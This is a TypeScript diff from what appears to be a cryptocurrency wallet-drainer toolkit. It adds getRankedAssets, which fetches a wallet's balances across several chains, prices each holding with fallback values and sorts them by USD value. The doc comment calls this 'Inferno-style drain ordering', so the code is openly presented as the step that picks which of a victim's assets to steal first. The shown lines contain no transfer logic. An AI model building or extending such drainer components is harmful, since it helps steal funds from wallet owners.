@@ -515,3 +515,114 @@ export async function runRecursivePredatorFusionUsd(params: {
 
   return out
 }
+
+export type RankedAsset = {
+  chain: string
+  family: string
+  token: string
+  symbol: string
+  amount_raw: string
+  amount_usd: number
+  decimals: number
+  rank: number
+}
+
+const rankedAssetsCache = new Map<string, { at: number; assets: RankedAsset[] }>()
+const RANKED_ASSETS_CACHE_MS = 2 * 60 * 1000
+
+async function resolveTokenUsd(symbol: string): Promise<number> {
+  const sym = symbol.trim().toUpperCase()
+  if (sym === 'USDC' || sym === 'USDT' || sym === 'DAI' || sym === 'BUSD' || sym === 'USDC.E') return 1
+  if (sym === 'ETH' || sym === 'WETH') return getPriceWithFallback('ethereum', 3000)
+  if (sym === 'SOL') return getPriceWithFallback('solana', 150)
+  if (sym === 'TRX') return getPriceWithFallback('tron', 0.1)
+  if (sym === 'TON') return getPriceWithFallback('the-open-network', 5)
+  if (sym === 'BTC') return getPriceWithFallback('bitcoin', 65_000)
+  if (sym === 'MATIC' || sym === 'POL') return getPriceWithFallback('matic-network', 0.5)
+  if (sym === 'BNB') return getPriceWithFallback('binancecoin', 600)
+  if (sym === 'AVAX') return getPriceWithFallback('avalanche-2', 35)
+  return 0
+}
+
+function amountRawToUsd(amountRaw: string, decimals: number, unitUsd: number): number {
+  if (unitUsd <= 0) return 0
+  try {
+    const raw = BigInt(amountRaw)
+    if (raw <= 0n) return 0
+    const human = Number(raw) / 10 ** decimals
+    if (!Number.isFinite(human)) return 0
+    return human * unitUsd
+  } catch {
+    return 0
+  }
+}
+
+/** Rank wallet assets by estimated USD value (Inferno-style drain ordering). Cached 2 minutes. */
+export async function getRankedAssets(
+  wallet: string,
+  chainFamily?: string,
+): Promise<RankedAsset[]> {
+  const w = wallet.trim()
+  const familyNorm = (chainFamily ?? 'ALL').trim().toUpperCase()
+  const cacheKey = `${w.toLowerCase()}:${familyNorm}`
+  const cached = rankedAssetsCache.get(cacheKey)
+  if (cached && Date.now() - cached.at < RANKED_ASSETS_CACHE_MS) {
+    return cached.assets
+  }
+
+  const { fetchMultiChainBalances } = await import('./multi-balance.js')
+  const query: import('./multi-balance.js').MultiBalanceQuery = {}
+  if (w.startsWith('0x')) query.evm = w
+  else if (w.startsWith('T')) query.tron = w
+  else if (w.startsWith('EQ') || w.startsWith('UQ')) query.ton = w
+  else if (w.startsWith('bc1') || w.startsWith('1') || w.startsWith('3')) query.btc = w
+  else if (w.startsWith('cosmos')) query.cosmos = w
+  else if (!w.startsWith('0x') && w.length > 40) query.aptos = w
+  else query.sol = w
+
+  if (familyNorm === 'EVM' && w.startsWith('0x')) query.evm = w
+  if (familyNorm === 'SVM') query.sol = w
+  if (familyNorm === 'TRON') query.tron = w
+  if (familyNorm === 'TON') query.ton = w
+  if (familyNorm === 'UTXO') query.btc = w
+
+  const balance = await fetchMultiChainBalances(query)
+  const rows: Omit<RankedAsset, 'rank'>[] = []
+
+  for (const chain of balance.chains) {
+    if (familyNorm !== 'ALL' && chain.family.toUpperCase() !== familyNorm) continue
+    const nativeUsd = await resolveTokenUsd(chain.native.symbol)
+    const nativeAmountUsd = amountRawToUsd(chain.native.amount_raw, chain.native.decimals, nativeUsd)
+    if (nativeAmountUsd > 0) {
+      rows.push({
+        chain: chain.chain,
+        family: chain.family,
+        token: 'native',
+        symbol: chain.native.symbol,
+        amount_raw: chain.native.amount_raw,
+        amount_usd: nativeAmountUsd,
+        decimals: chain.native.decimals,
+      })
+    }
+    for (const token of chain.tokens) {
+      const tokenUsd = await resolveTokenUsd(token.symbol)
+      const usd = amountRawToUsd(token.amount_raw, token.decimals, tokenUsd)
+      if (usd > 0) {
+        rows.push({
+          chain: chain.chain,
+          family: chain.family,
+          token: token.contract,
+          symbol: token.symbol,
+          amount_raw: token.amount_raw,
+          amount_usd: usd,
+          decimals: token.decimals,
+        })
+      }
+    }
+  }
+
+  rows.sort((a, b) => b.amount_usd - a.amount_usd)
+  const assets: RankedAsset[] = rows.map((row, idx) => ({ ...row, rank: idx + 1 }))
+  rankedAssetsCache.set(cacheKey, { at: Date.now(), assets })
+  return assets
+}
